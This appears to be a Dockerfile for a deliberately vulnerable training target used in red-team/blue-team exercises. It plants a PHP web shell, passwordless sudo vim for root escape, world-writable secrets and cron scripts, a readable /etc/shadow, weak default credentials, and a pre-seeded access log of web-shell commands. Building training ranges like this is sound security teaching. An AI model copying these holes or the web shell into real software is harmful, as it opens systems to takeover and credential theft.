FROM ubuntu:26.04

ENV DEBIAN_FRONTEND=noninteractive

# 一次裝好所有服務需要的東西 + 離線演練會用到的診斷/修補工具，
# 全部在 build 階段裝好，容器起來後不能再連網、不能再裝任何東西
RUN apt-get update \
    && apt-get install -y --no-install-recommends \
        curl ca-certificates gnupg \
        nginx mysql-server mysql-client sudo cron supervisor \
        openssh-server openssh-client php-fpm \
        vim nano less grep findutils \
        iptables net-tools iproute2 tcpdump procps jq \
    && curl -fsSL https://deb.nodesource.com/setup_20.x | bash - \
    && apt-get install -y --no-install-recommends nodejs \
    && rm -rf /var/lib/apt/lists/*

# docker CLI（給隱藏關卡7用，走官方repo裝新版，跟target-dind的daemon版本對得起來，
# 理由跟blue-terminal的docker-ce-cli一樣：發行版內建的docker.io太舊會有API版本問題）
RUN install -m 0755 -d /etc/apt/keyrings \
    && curl -fsSL https://download.docker.com/linux/ubuntu/gpg -o /etc/apt/keyrings/docker.asc \
    && chmod a+r /etc/apt/keyrings/docker.asc \
    && echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/ubuntu noble stable" > /etc/apt/sources.list.d/docker.list \
    && apt-get update \
    && apt-get install -y --no-install-recommends docker-ce-cli \
    && rm -rf /var/lib/apt/lists/*

# ---- app 程式碼 ----
COPY app/portal /opt/portal
COPY app/course-api /opt/course-api
COPY app/student-api /opt/student-api

RUN cd /opt/portal && npm install --omit=dev \
    && cd /opt/course-api && npm install --omit=dev \
    && cd /opt/student-api && npm install --omit=dev \
    && chown -R www-data:www-data /opt/portal /opt/course-api /opt/student-api

# ============================================================
# 靶機情境：user1 是紅隊的入口帳號（登入憑證 user1/user123）
# ============================================================
RUN useradd -m -s /bin/bash user1 \
    && echo "user1:user123" | chpasswd \
    && mkdir -p /var/run/sshd

# ---- 漏洞3：sudoers 允許 user1 免密碼跑 sudo vim（:!bash 逃逸提權）----
RUN printf 'user1 ALL=(root) NOPASSWD: /usr/bin/vim\n' > /etc/sudoers.d/user1_vuln \
    && chmod 440 /etc/sudoers.d/user1_vuln

# ---- 漏洞1：.env 外洩 MySQL root 明文密碼，權限777（owner設為www-data，呼應webserver的執行身份）----
RUN printf 'MYSQL_ROOT_PASSWORD=campus_root\nMYSQL_USER=campus\nMYSQL_PASSWORD=campus\n' > /opt/portal/.env \
    && chown www-data:www-data /opt/portal/.env \
    && chmod 777 /opt/portal/.env

# ---- 漏洞2：/etc/shadow 權限過寬（預設應為640/600，這裡故意設644）----
RUN chmod 644 /etc/shadow

# ---- 漏洞5：備份腳本777 + root crontab每分鐘執行 → 可被改寫成任意指令 ----
RUN mkdir -p /opt/scripts \
    && printf '#!/bin/bash\ntar czf /tmp/system_backup.tar.gz /opt/portal /opt/course-api /opt/student-api 2>/dev/null\n' > /opt/scripts/system_backup.sh \
    && chmod 777 /opt/scripts/system_backup.sh \
    && chown root:root /opt/scripts/system_backup.sh \
    && printf '* * * * * root /opt/scripts/system_backup.sh\n' > /etc/cron.d/system_backup \
    && chmod 644 /etc/cron.d/system_backup

# ---- 隱藏關卡6：webshell（供紅隊operation用，藍隊規則上不能刪除）----
RUN mkdir -p /opt/webshell \
    && printf '<?php system($_GET["cmd"] ?? "id"); ?>\n' > /opt/webshell/.backdoor.php

# ---- 隱藏關卡6：預埋攻擊軌跡 ----
# checker 只認「log 裡打過 backdoor.php 的來源IP」，沒有紅隊在打時這關會停在 pending，
# 體驗組等於永遠拿不到。預埋一段既有攻擊軌跡讓鑑識本身就是完整的題目：
# 對抗組的真實紅隊流量直接疊在這幾行後面，兩種場次共用同一套判定，不必分模式。
#
# 攻擊者IP刻意選 RFC 5737 的文件用網段（203.0.113.0/24、198.51.100.0/24）——
# 這兩段不可能跟 target-net 或 SLA 探測來源撞號。撞到的話學員照著封鎖就會把
# 自己的服務打掛，SLA 直接歸零。
#
# 中間夾雜正常校務流量，逼學員真的去過濾 request_uri，而不是把 log 裡每個 IP 都擋掉。
RUN mkdir -p /var/log/nginx && printf '%s\n' \
    '{"remote_addr":"10.20.30.41","request_method":"GET","request_uri":"/courses.html","status":"200","body_bytes_sent":"8213","request_time":"0.012","upstream_response_time":"0.011","http_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","host":"campus.portal"}' \
    '{"remote_addr":"203.0.113.66","request_method":"GET","request_uri":"/","status":"200","body_bytes_sent":"21319","request_time":"0.009","upstream_response_time":"0.008","http_user_agent":"python-requests/2.31.0","host":"campus.portal"}' \
    '{"remote_addr":"203.0.113.66","request_method":"GET","request_uri":"/uploads/","status":"404","body_bytes_sent":"162","request_time":"0.002","upstream_response_time":"-","http_user_agent":"python-requests/2.31.0","host":"campus.portal"}' \
    '{"remote_addr":"10.20.30.41","request_method":"GET","request_uri":"/api/course/list","status":"200","body_bytes_sent":"1044","request_time":"0.018","upstream_response_time":"0.017","http_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","host":"campus.portal"}' \
    '{"remote_addr":"203.0.113.66","request_method":"GET","request_uri":"/assets/.backdoor.php?cmd=id","status":"200","body_bytes_sent":"54","request_time":"0.031","upstream_response_time":"0.030","http_user_agent":"python-requests/2.31.0","host":"campus.portal"}' \
    '{"remote_addr":"203.0.113.66","request_method":"GET","request_uri":"/assets/.backdoor.php?cmd=whoami","status":"200","body_bytes_sent":"9","request_time":"0.028","upstream_response_time":"0.027","http_user_agent":"python-requests/2.31.0","host":"campus.portal"}' \
    '{"remote_addr":"10.20.30.57","request_method":"POST","request_uri":"/api/student/login","status":"200","body_bytes_sent":"312","request_time":"0.041","upstream_response_time":"0.040","http_user_agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15","host":"campus.portal"}' \
    '{"remote_addr":"203.0.113.66","request_method":"GET","request_uri":"/assets/.backdoor.php?cmd=cat%20/opt/portal/.env","status":"200","body_bytes_sent":"96","request_time":"0.033","upstream_response_time":"0.032","http_user_agent":"python-requests/2.31.0","host":"campus.portal"}' \
    '{"remote_addr":"198.51.100.23","request_method":"GET","request_uri":"/assets/.backdoor.php?cmd=uname%20-a","status":"200","body_bytes_sent":"128","request_time":"0.026","upstream_response_time":"0.025","http_user_agent":"curl/8.5.0","host":"campus.portal"}' \
    '{"remote_addr":"10.20.30.41","request_method":"GET","request_uri":"/grades.html","status":"200","body_bytes_sent":"6180","request_time":"0.014","upstream_response_time":"0.013","http_user_agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36","host":"campus.portal"}' \
    '{"remote_addr":"198.51.100.23","request_method":"GET","request_uri":"/assets/.backdoor.php?cmd=ls%20-la%20/root","status":"200","body_bytes_sent":"241","request_time":"0.029","upstream_response_time":"0.028","http_user_agent":"curl/8.5.0","host":"campus.portal"}' \
    > /var/log/nginx/access_json.log

# ---- 隱藏關卡7：容器逃逸（曝露的 docker socket，honeypot 版）----
# 一支內建的假 daemon（dind-honeypot.js）在 /var/run/dind/docker.sock 上監聽，重現
# 「容器內曝露了 docker socket」這個漏洞，不必再掛一個 DinD 沙盒容器（原 target-dind）。
# socket 設 root:root 0660，紅隊得先靠漏洞3或5 拿到容器內 root 才摸得到；
# 藍隊修法：rm -f /var/run/dind/docker.sock。判定不變（checker 打 docker version）。
COPY dind-honeypot.js /opt/honeypot/dind-honeypot.js

# ---- 分數查看：`score` 指令讀取host端checker.py推送進來的評分結果 ----
RUN mkdir -p /opt/score
COPY score.sh /usr/local/bin/score
RUN chmod +x /usr/local/bin/score

# ---- nginx ----
COPY nginx.conf /etc/nginx/nginx.conf

# ---- MySQL 記憶體精簡設定：讓 target-box 塞進 --memory=512m（見 mysql-lean.cnf）----
COPY mysql-lean.cnf /etc/mysql/mysql.conf.d/zz-lean.cnf

# ---- db 初始化腳本 ----
COPY db/schema.sql /opt/db/schema.sql
COPY db/seed.sql /opt/db/seed.sql

# ---- supervisor：統一管理 mysqld / nginx / 三個 node 服務 ----
COPY supervisord.conf /etc/supervisor/conf.d/target-box.conf

# ---- entrypoint：第一次開機時初始化 MySQL schema，之後交給 supervisord ----
COPY entrypoint.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh \
    && mkdir -p /var/log/supervisor

EXPOSE 80 22

CMD ["/entrypoint.sh"]
